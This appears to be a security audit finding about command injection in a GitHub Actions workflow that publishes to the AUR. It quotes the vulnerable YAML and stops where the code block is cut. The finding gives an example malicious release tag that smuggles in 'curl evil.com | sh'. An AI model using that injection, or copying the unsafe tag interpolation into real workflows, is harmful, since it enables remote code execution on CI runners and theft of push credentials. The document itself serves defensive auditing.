### [C-1] Command injection in `aur-publish.yml`
**File:** `.github/workflows/aur-publish.yml` lines 20-26
**Risk:** Attacker-controlled release tag (e.g. `v1.0.0; curl evil.com | sh`) executes arbitrary commands on the runner with AUR push credentials.

**Vulnerable code:**
```yaml
VERSION="${{ github.event.release.tag_name }}"
URL="https://github.com/fulsomenko/kanban/archive/v${VERSION}.tar.gz"
SHA256=$(curl -sL "$URL" | sha256sum | cut -d' ' -f1)
